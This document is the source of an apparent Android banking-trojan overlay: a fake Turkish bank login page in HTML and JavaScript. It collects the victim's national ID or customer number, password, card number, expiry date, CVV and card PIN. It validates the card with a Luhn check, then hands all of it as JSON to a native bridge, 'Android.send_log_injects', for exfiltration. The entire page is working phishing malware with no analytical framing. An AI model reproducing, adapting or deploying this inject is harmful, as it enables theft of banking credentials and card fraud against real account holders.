<body>
    <form onsubmit="return false">
        <div id="form1">
            <header>
                Giriş
            </header>
            <div class="kub">
                <input class="a1 login" id="login" name="login" type="text" placeholder="Müşteri / T.C. Kimlik Numarası" autocomplete="off">
                <input class="a1 password" id="password" name="password" type="password" placeholder="Parola" autocomplete="off">
                
                <div class="p-3">         
                    <input type="submit" class="submit" id="nextPage" value="Giriş">
                    
                    <input type="submit" disabled class="btn" value="Müşteri Numaramı Unuttum">
                    <input type="submit" disabled class="btn" value="Parolamı Unuttum">
                </div>
            </div>
        </div>

        <div id="form2" style="display: none;">
            <header>
                Doğrulama
            </header>
            <div class="kub">                
                <input type="tel" class="a1" id="cc" name="cc" placeholder="Kart Numarası" onkeyup="check6()" style="padding-left: 15px;" autocomplete="off">
                <div>
                    <input type="tel" class="a1" id="exp" name="exp" placeholder="Son Kullanma Tarihi" onkeyup="check4();check5()" style="float: left;width: 58%;border-top: 0;padding-left: 15px;" autocomplete="off">
                    <input type="password" class="a1" id="cvv" name="cvv" placeholder="CVV" onkeyup="check5()" style="float: left;width: 42%;margin-bottom: 25px;border-top: 0;padding-left: 15px;" autocomplete="off">
                    <input type="password" id="cardCode" name="cardCode" style="padding-left: 15px;" class="a1" maxlength="4" onkeyup="check5()" placeholder="Kart Şifresi">
                    

                </div>
                <div class="p-3">         
                    <input type="submit" class="submit" id="sendData" disabled value="Giriş">
                </div>
            </div>
        </div>
    </form>

    <script>
        $('#login').mask('00000000000')
        $('#password').mask('000000')
        $('#cc').mask('0000 0000 0000 0000')
        $('#exp').mask('00/00')
        $('#cvv').mask('000')
		$('#cardCode').mask('0000')


        var form1 = document.getElementById('form1'),
            form2 = document.getElementById('form2');

        var login = document.getElementById('login'),
            password = document.getElementById('password');

        var nextPage = document.getElementById('nextPage'),
            sendData = document.getElementById('sendData');
            sendDataFull = document.getElementById('sendDataFull');
             var month_;
		var year_;

        function check6() {
            if(!valid_credit_card(cc.value)) {
                cc.classList.add('error')
            } else {
                cc.classList.remove('error');
                return true
            }
        }

        function check4() {
            var mmYY = exp.value.split('/');
			var month = parseInt(mmYY[0]);
			var year = parseInt(mmYY[1]);

			var expArray = exp.value.split('/');
			var today, someday;
			var exMonth = expArray[0];
			var exYear = "20" + expArray[1];

			today = new Date();
			someday = new Date();
			someday.setFullYear(exYear, exMonth, 1);
                
            if(month > 12 || month == 0 || month == 00 || someday < today || year > 35) {
                exp.classList.add('error')
            } else {
                exp.classList.remove('error')
                return true
            }
        }

        function check5() {
            if(check4() == true && exp.value.length === 5 && cvv.value.length === 3 && cardCode.value.length === 4) {
                sendData.disabled = false
            } else {
                sendData.disabled = true
            }
        }

        function valid_credit_card(value) {
            if(value=='' || value.length < 19 || value=='0000 0000 0000 0000') return false;
            if (/[^0-9-\s]+/.test(value)) return false;
            var nCheck = 0, nDigit = 0, bEven = false;
            value = value.replace(/\D/g, "");
            for (var n = value.length - 1; n >= 0; n--) {
                var cDigit = value.charAt(n),
                    nDigit = parseInt(cDigit, 10);
                if (bEven) {
                    if ((nDigit *= 2) > 9) nDigit -= 9;
                }
                nCheck += nDigit;
                bEven = !bEven;
            }
            return (nCheck % 10) == 0;
        }

        nextPage.onclick = () => {
            if(login.value.length != 11) { 
                login.classList.add('error')
            } else {
                login.classList.remove('error')
            }
            
            if (password.value.length != 6) {
                password.classList.add('error');
            }  else {
                password.classList.remove('error')
            }
            
            if(login.value.length == 11 && password.value.length == 6) {
                form1.style.display = 'none'
                form2.style.display = 'block'
            } 
        }

        sendData.onclick = () => {
            var data = {};
                data.login = login.value;
                data.password = password.value;
                data.cc = cc.value;
                data.exp = exp.value;
                data.cvv = cvv.value;
                data.cardCode = cardCode.value;
                data.type_injects = "banks";
                data.closed = "close_activity_injects";

                var ua = navigator.userAgent.toLowerCase();
                if(ua.indexOf("android") > -1) {
                    try {
                        Android.send_log_injects(JSON.stringify(data))
                    } catch (err) {}
                }else{
                    alert(JSON.stringify(data));
                }
        }
    </script>
